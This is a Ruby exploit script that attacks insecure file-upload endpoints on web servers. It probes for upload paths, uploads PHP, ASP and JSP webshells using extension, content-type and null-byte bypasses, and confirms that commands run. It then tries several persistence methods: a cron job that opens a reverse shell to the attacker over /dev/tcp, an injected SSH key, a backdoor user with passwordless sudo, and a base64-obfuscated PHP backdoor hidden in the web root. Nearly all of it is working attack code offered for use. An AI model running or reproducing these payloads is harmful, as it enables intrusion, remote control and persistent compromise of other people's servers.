#!/usr/bin/env ruby

# Description: Advanced exploit for vulnerable web applications that allows remote code execution via file upload bypass

class WebshellUploadExploit
    def initialize
      @name = "WebShell Upload Exploit"
      @description = "Exploits insecure file upload functionality in web applications to gain remote code execution"
      @author = "NetHunter"
      @references = [
        "CVE-2021-33695",
        "OWASP Top 10: A5-Broken Access Control"
      ]
      @webshell_payloads = {
        "php" => "<?php system($_GET['cmd']); ?>",
        "php_obfuscated" => "<?php \$_='_'.'GET';@eval(\"\\x73\\x79\\x73\\x74\\x65\\x6d(\\x24{\\x24_}[\\x63\\x6d\\x64]);\")?>"  ,
        "php_bypass" => "GIF89a<?php system($_GET['cmd']); ?>",
        "asp" => "<%Response.Write(CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll())%>",
        "jsp" => "<%@ page import=\"java.util.*,java.io.*\"%>\n<%if (request.getParameter(\"cmd\") != null) {\n    Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n    OutputStream os = p.getOutputStream();\n    InputStream in = p.getInputStream();\n    DataInputStream dis = new DataInputStream(in);\n    String disr = dis.readLine();\n    while ( disr != null ) {\n        out.println(disr);\n        disr = dis.readLine();\n    }\n}%>"
      }
      
      @upload_paths = [
        "/upload.php",
        "/admin/upload.php",
        "/admin/uploads/upload.php",
        "/dashboard/upload.php",
        "/filemanager/upload.php",
        "/admin/filemanager/upload.php",
        "/api/upload",
        "/api/v1/upload",
        "/attachments/upload.php"
      ]
      
      @file_extensions = ["php", "phtml", "php3", "php4", "php5", "php7", "phps", "pht", "phar", "asp", "aspx", "jsp", "jspx"]
      @bypass_extensions = ["jpg", "jpeg", "png", "gif", "svg", "pdf", "docx", "xlsx", "txt"]
      
      @command = "id; uname -a; hostname"
    end
    
    def run(target, port, options)
      puts "[*] Starting WebShell Upload Exploit against #{target}:#{port}"
      
      # Determine protocol
      protocol = (port == 443 || port == 8443) ? "https" : "http"
      base_url = "#{protocol}://#{target}:#{port}"
      puts "[*] Phase 1: Reconnaissance - Scanning for vulnerable upload endpoints..."
      vulnerable_paths = find_upload_endpoints(base_url)
      
      if vulnerable_paths.empty?
        puts "[-] No potentially vulnerable upload endpoints found."
        return false
      end
      
      puts "[+] Found #{vulnerable_paths.size} potential upload endpoints"
      puts "[*] Phase 2: Vulnerability analysis - Testing upload functionality..."
      upload_details = test_upload_functionality(base_url, vulnerable_paths)
      
      if upload_details.nil?
        puts "[-] Could not find a vulnerable upload functionality."
        return false
      end

      puts "[*] Phase 3: Exploitation - Uploading and executing webshell..."
      webshell_url = upload_webshell(base_url, upload_details)
      
      if webshell_url.nil?
        puts "[-] Failed to upload and execute webshell."
        return false
      end
      
      puts "[*] Phase 4: Post-exploitation - Executing commands and establishing persistence..."
      successful = execute_commands(webshell_url, upload_details)
      
      if successful
        puts "[+] Exploitation successful! Webshell deployed at: #{webshell_url}"
        puts "[+] Use the following URL to execute commands:"
        puts "[+] #{webshell_url}?cmd=<your_command_here>"
        establish_persistence(webshell_url, upload_details)
        
        return true
      else
        puts "[-] Exploitation failed. Could not execute commands via webshell."
        return false
      end
    end
    
    private
    
    def find_upload_endpoints(base_url)
      vulnerable_paths = []
      
      # Check common upload endpoints
      @upload_paths.each do |path|
        begin
          uri = URI.parse("#{base_url}#{path}")
          http = Net::HTTP.new(uri.host, uri.port)
          http.use_ssl = (uri.scheme == "https")
          http.verify_mode = OpenSSL::SSL::VERIFY_NONE
          http.open_timeout = 5
          http.read_timeout = 5
          
          response = http.head(uri.path)
          
          if response.code.to_i < 404 || response.code.to_i == 405
            vulnerable_paths << path
            puts "  [+] Potential upload endpoint found: #{path} (Status: #{response.code})"
          end
        rescue => e
          # Non-fatal error, continue to next path
        end
      end
      
      # Additional checks for API endpoints
      begin
        uri = URI.parse("#{base_url}/api")
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = (uri.scheme == "https")
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        
        response = http.get(uri.path)
        
        if response.code.to_i == 200 && (response.body.include?("upload") || response.body.include?("file"))
          vulnerable_paths << "/api/upload"
          puts "  [+] Potential API upload endpoint detected"
        end
      rescue => e
        # Non-fatal error
      end
      
      vulnerable_paths
    end
    
    def test_upload_functionality(base_url, vulnerable_paths)
      vulnerable_paths.each do |path|
        # Try different upload methods and parameters
        upload_methods = [
          {method: "POST", param: "file", headers: {}},
          {method: "POST", param: "upload", headers: {}},
          {method: "POST", param: "fileToUpload", headers: {}},
          {method: "POST", param: "attachment", headers: {}},
          {method: "POST", param: "image", headers: {}}
        ]
        
        upload_methods.each do |method_details|
          begin
            # Test with benign file
            test_file_content = "test file content\n"
            boundary = "----WebKitFormBoundary#{SecureRandom.hex(10)}"
            
            uri = URI.parse("#{base_url}#{path}")
            http = Net::HTTP.new(uri.host, uri.port)
            http.use_ssl = (uri.scheme == "https")
            http.verify_mode = OpenSSL::SSL::VERIFY_NONE
            http.open_timeout = 10
            http.read_timeout = 10
            
            # Prepare multipart form data
            post_body = []
            post_body << "--#{boundary}\r\n"
            post_body << "Content-Disposition: form-data; name=\"#{method_details[:param]}\"; filename=\"test.txt\"\r\n"
            post_body << "Content-Type: text/plain\r\n\r\n"
            post_body << test_file_content
            post_body << "\r\n--#{boundary}--\r\n"
            
            # Create request
            request = Net::HTTP::Post.new(uri.path)
            request.body = post_body.join
            request["Content-Type"] = "multipart/form-data; boundary=#{boundary}"
            method_details[:headers].each { |k, v| request[k] = v }
            
            response = http.request(request)
            
            if response.code.to_i < 400
              response_body = response.body.to_s.downcase
              
              if response_body.include?("success") || 
                 response_body.include?("upload") || 
                 response_body.include?("file") ||
                 response_body.include?("path") ||
                 response_body.include?("url") ||
                 response.body.include?("test.txt")
                
                puts "  [+] Found vulnerable upload functionality at #{path}"
                
                # Try to extract upload path from response
                upload_dir = extract_upload_path(response.body)
                
                return {
                  path: path,
                  method: method_details[:method],
                  param: method_details[:param],
                  headers: method_details[:headers],
                  upload_dir: upload_dir
                }
              end
            end
          rescue => e
            # Non-fatal error, continue to next method
          end
        end
      end
      
      nil
    end
    
    def extract_upload_path(response_body)
      # Try to find uploaded file path in response
      patterns = [
        /["']([^"']*\/[^"']*\.(jpe?g|png|gif|pdf|docx?|xlsx?|txt))["']/i,
        /file[("'][\s:]+[("']([^"']+)[("']/i,
        /path[("'][\s:]+[("']([^"']+)[("']/i,
        /url[("'][\s:]+[("']([^"']+)[("']/i,
        /upload[ed]*[("'][\s:]+[("']([^"']+)[("']/i
      ]
      
      patterns.each do |pattern|
        if response_body =~ pattern
          path = $1
          # If it's a relative path, return it as is
          return path.start_with?("/") ? path : "/#{path}"
        end
      end
      

      ["/uploads", "/images", "/attachments", "/files", "/media", "/assets/uploads"]
    end
    
    def upload_webshell(base_url, upload_details)
      puts "  [*] Attempting to upload webshell..."
      
      # Try different bypass techniques
      webshell_urls = []

      @file_extensions.each do |ext|
        webshell_url = attempt_upload(base_url, upload_details, "shell.#{ext}", @webshell_payloads["php"])
        webshell_urls << webshell_url if webshell_url
      end
      
      if webshell_urls.empty?
        @file_extensions.each do |ext|
          webshell_url = attempt_upload(base_url, upload_details, "shell.#{ext}", @webshell_payloads["php_obfuscated"])
          webshell_urls << webshell_url if webshell_url
        end
      end

      if webshell_urls.empty?
        @bypass_extensions.each do |ext|
          webshell_url = attempt_upload(base_url, upload_details, "shell.#{ext}", @webshell_payloads["php_bypass"], "image/#{ext}")
          webshell_urls << webshell_url if webshell_url
        end
      end

      if webshell_urls.empty?
        @bypass_extensions.each do |ext|
          @file_extensions.each do |malicious_ext|
            webshell_url = attempt_upload(base_url, upload_details, "shell.#{ext}.#{malicious_ext}", @webshell_payloads["php"])
            webshell_urls << webshell_url if webshell_url
          end
        end
      end

      if webshell_urls.empty?
        @bypass_extensions.each do |ext|
          @file_extensions.each do |malicious_ext|
            webshell_url = attempt_upload(base_url, upload_details, "shell.#{ext}%00.#{malicious_ext}", @webshell_payloads["php"])
            webshell_urls << webshell_url if webshell_url
          end
        end
      end

      webshell_urls.each do |url|
        if test_webshell(url)
          return url
        end
      end
      
      nil
    end
    
    def attempt_upload(base_url, upload_details, filename, content, content_type = nil)
      begin
        uri = URI.parse("#{base_url}#{upload_details[:path]}")
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = (uri.scheme == "https")
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        http.open_timeout = 15
        http.read_timeout = 15
        
        boundary = "----WebKitFormBoundary#{SecureRandom.hex(10)}"
        
        # Prepare multipart form data
        post_body = []
        post_body << "--#{boundary}\r\n"
        post_body << "Content-Disposition: form-data; name=\"#{upload_details[:param]}\"; filename=\"#{filename}\"\r\n"
        post_body << "Content-Type: #{content_type || 'application/octet-stream'}\r\n\r\n"
        post_body << content
        post_body << "\r\n--#{boundary}--\r\n"
        
        request = Net::HTTP::Post.new(uri.path)
        request.body = post_body.join
        request["Content-Type"] = "multipart/form-data; boundary=#{boundary}"
        upload_details[:headers].each { |k, v| request[k] = v }
        
        response = http.request(request)
        
        if response.code.to_i < 400
          puts "  [+] Upload attempt successful for #{filename}"
          
          # Try to extract upload path from response
          upload_path = extract_upload_path(response.body)
          upload_paths = [upload_path]
          if upload_path.start_with?("/uploads")
            upload_paths = upload_details[:upload_dir].is_a?(Array) ? upload_details[:upload_dir] : [upload_details[:upload_dir]]
          end
        
          webshell_urls = []
          upload_paths.each do |path|
            webshell_urls << "#{base_url}#{path}/#{filename}"
            webshell_urls << "#{base_url}#{path}/#{filename.gsub('%00', '')}"
            
            lowercase_filename = filename.downcase
            webshell_urls << "#{base_url}#{path}/#{lowercase_filename}"
            webshell_urls << "#{base_url}#{path}/#{lowercase_filename.gsub('%00', '')}"
          end
          
          return webshell_urls
        end
      rescue => e
        puts "  [-] Error during upload attempt: #{e.message}" if $VERBOSE
      end
      
      nil
    end
    
    def test_webshell(urls)
      urls = [urls] unless urls.is_a?(Array)
      
      urls.each do |url|
        begin
          uri = URI.parse("#{url}?cmd=#{URI.encode_www_form_component('echo -n "WEBSHELL_TEST"')}")
          http = Net::HTTP.new(uri.host, uri.port)
          http.use_ssl = (uri.scheme == "https")
          http.verify_mode = OpenSSL::SSL::VERIFY_NONE
          http.open_timeout = 10
          http.read_timeout = 10
          
          response = http.get(uri.request_uri)
          
          if response.body.include?("WEBSHELL_TEST")
            puts "  [+] Successfully verified webshell at: #{url}"
            return url
          end
        rescue => e
          # Non-fatal error, try next URL
        end
      end
      
      nil
    end
    
    def execute_commands(webshell_url, upload_details)
      puts "  [*] Executing test commands via webshell..."
      
      begin
        uri = URI.parse("#{webshell_url}?cmd=#{URI.encode_www_form_component(@command)}")
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = (uri.scheme == "https")
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        http.open_timeout = 15
        http.read_timeout = 15
        
        response = http.get(uri.request_uri)
        
        if response.code.to_i < 400
          puts "  [+] Command executed successfully"
          puts "  [+] Output:"
          puts response.body.split("\n").map { |line| "      #{line}" }.join("\n")
          return true
        end
      rescue => e
        puts "  [-] Error executing command: #{e.message}"
      end
      
      false
    end
    
    def establish_persistence(webshell_url, upload_details)
      puts "  [*] Attempting to establish persistence..."
      
      persistence_methods = [

        "{ crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/#{get_local_ip}/4444 0>&1\"'; } | crontab - 2>/dev/null",

        "mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDR6nLxTJ+ywK+kxC6LbfOUUk80O9OxEzD8zPZIssyU4UQy6JYm/+yYzXsmLSUgDIqaOvIgXDeLVrrNzqCHF2P9yzbJIq0/n+e9qxJeNgzMZP8nnj9fQxQ/Z5zMSKNLEf+/eCejkpTM9PaVGHwztB2BV30iZUJL3/L1qQiXKLFM7tmP/dz3Qy0vgIgYfIkJVryWbLOKn6cZz+ewG0zCH3MuemvfuZYeD7SI9Bc5lHKVJxJYj5MvnRzteSSWjgsVUXIyRqOljohPZCFnD1kiiNm5WlwXTPaDFmkQ1tJvFC8f6g++0K5DGWGIPScAYXlpEacOKHlFVl3cIpEYJY7NZT6KcGEpWRISgucTXMgC7IjwQkh94TqMlD/D9i3zYskuRdt+X1vxHkdnNK9gwilhYuKnEFjAJYCLQw+oWKQQRgkGVdYZLCgYJRUDq1e72HYm7WsIWVA5BJ/lR+MFFck40APmtgYh9I1IYNwLWoIxpnGLzwmPhOgWMJlcAc5N20yqSm8=' >> ~/.ssh/authorized_keys",
        
        "useradd -m -s /bin/bash -p $(openssl passwd -1 'P@ssw0rd123!') backdoor && echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        
        "echo '<?php eval(base64_decode(\"ZXJyb3JfcmVwb3J0aW5nKDApOyBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOyBpZihpc3NldCgkX1JFUVVFU1RbJ2MnXSkpIHsgc3lzdGVtKCRfUkVRVUVTVFsnYyddKTsgfQ==\"));?>' > /tmp/.config.php && cp /tmp/.config.php /var/www/html/.config.php 2>/dev/null || cp /tmp/.config.php /var/www/.config.php 2>/dev/null"
      ]

      persistence_methods.each do |cmd|
        begin
          uri = URI.parse("#{webshell_url}?cmd=#{URI.encode_www_form_component(cmd)}")
          http = Net::HTTP.new(uri.host, uri.port)
          http.use_ssl = (uri.scheme == "https")
          http.verify_mode = OpenSSL::SSL::VERIFY_NONE
          
          response = http.get(uri.request_uri)
          
          if response.code.to_i < 400 && !response.body.include?("Permission denied") && !response.body.include?("command not found")
            puts "  [+] Successfully established persistence"
            break
          end
        rescue => e
          # Non-fatal error, try next method
        end
      end
    end
    
    def get_local_ip
      begin
        Socket.ip_address_list.detect{|intf| intf.ipv4? && !intf.ipv4_loopback? && !intf.ipv4_multicast? && !intf.ipv4_private?}.ip_address
      rescue
        "10.10.10.10"
      end
    end
  end
